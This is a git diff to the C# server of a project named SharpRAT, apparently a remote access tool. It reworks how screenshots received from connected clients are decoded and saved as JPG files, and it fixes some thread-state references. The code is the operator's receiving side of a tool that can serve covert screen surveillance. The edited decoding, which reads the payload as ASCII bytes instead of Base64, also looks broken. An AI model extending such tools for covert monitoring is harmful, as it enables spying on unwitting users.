@@ -3,6 +3,8 @@ using System.Net;
 using System.Net.Sockets;
 using Server.UI;
 using System.Diagnostics;
+using System.Drawing.Imaging;
+using System.Drawing;
 
 namespace Server.Server
 {
@@ -116,6 +118,7 @@ namespace Server.Server
             if (tempString.StartsWith("<SCREENSHOT>"))
             {
                 Debug.WriteLine("string started with screenshot");
+                data = data.Replace("<SCREENSHOT>", "");
                 Readimage(data);
             }
             if (data.StartsWith("<FILE>"))
@@ -200,7 +203,23 @@ namespace Server.Server
                 Log.Error("SendCallback: " + e.Message);
             }
         }
+        private static readonly ImageConverter _imageConverter = new ImageConverter();
+        public static Bitmap GetImageFromByteArray(byte[] byteArray)
+        {
+            Bitmap bm = (Bitmap)_imageConverter.ConvertFrom(byteArray);
 
+            if (bm != null && (bm.HorizontalResolution != (int)bm.HorizontalResolution ||
+                               bm.VerticalResolution != (int)bm.VerticalResolution))
+            {
+                // Correct a strange glitch that has been observed in the test program when converting 
+                //  from a PNG file image created by CopyImageToByteArray() - the dpi value "drifts" 
+                //  slightly away from the nominal integer value
+                bm.SetResolution((int)(bm.HorizontalResolution + 0.5f),
+                                 (int)(bm.VerticalResolution + 0.5f));
+            }
+
+            return bm;
+        }
         public static void Readimage(string data)
         {
             try
@@ -209,19 +228,22 @@ namespace Server.Server
                 data = data.Replace("<SCREENSHOT>", "");
                 data = data.Replace("<EOF>", "");
                 //clientSocket.Receive(dataSize);
-                byte[] bx = Convert.FromBase64String(data);
+
+                byte[] bx = Encoding.ASCII.GetBytes(data);
+                //byte[] bx = Convert.ToBase64String(plainTextBytes);
                 if (bx.Length > 0)
                 {
                     //string base64 = Convert.ToBase64String(dataSize);
                     //base64 = base64.Replace("<SCREENSHOT>", "");
                     //base64 = base64.Replace("<EOF>", "");
                     //byte[] bx = Convert.FromBase64String(base64);
-                    string imageName = (Environment.SpecialFolder.ApplicationData) + $"\\SharpRAT\\" + System.DateTime.Now.Ticks + ".JPG";
-                    MemoryStream ms = new MemoryStream(bx);
-                    Image img = Image.FromStream(ms);
-                    img.Save(imageName, System.Drawing.Imaging.ImageFormat.Jpeg);
-
-                    ms.Close();
+                    string imageName = "Image-" + System.DateTime.Now.Ticks + ".JPG";
+                    //string imageName = string.Format(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) +  @"\SharpRAT\screenshotServer\" + System.DateTime.Now.Ticks + ".Jpeg");
+                    //MemoryStream ms = new MemoryStream(bx);
+                    //Image.FromStream(new MemoryStream());
+                    Image img =GetImageFromByteArray(bx);
+                    img.Save(imageName, ImageFormat.Jpeg);
+                    //ms.Close();
                     Debug.WriteLine("screenshot retrieved successfully");
                 }
             }
@@ -271,7 +293,7 @@ namespace Server.Server
         {
             // Start the server on it's own thread, so it does not hog all the UI resources.
             serverThread = new Thread(ExecuteServer);
-            if (serverThread.ThreadState != ThreadState.Running)
+            if (serverThread.ThreadState != System.Threading.ThreadState.Running)
             {
                 serverThread.IsBackground = true;
                 serverThread.Start();
@@ -280,7 +302,7 @@ namespace Server.Server
 
             // Ping clients on background thread.
             checkClientsThread = new Thread(CheckClientsThread);
-            if (checkClientsThread.ThreadState != ThreadState.Running)
+            if (checkClientsThread.ThreadState != System.Threading.ThreadState.Running)
             {
                 checkClientsThread.IsBackground = true;
                 checkClientsThread.Start();
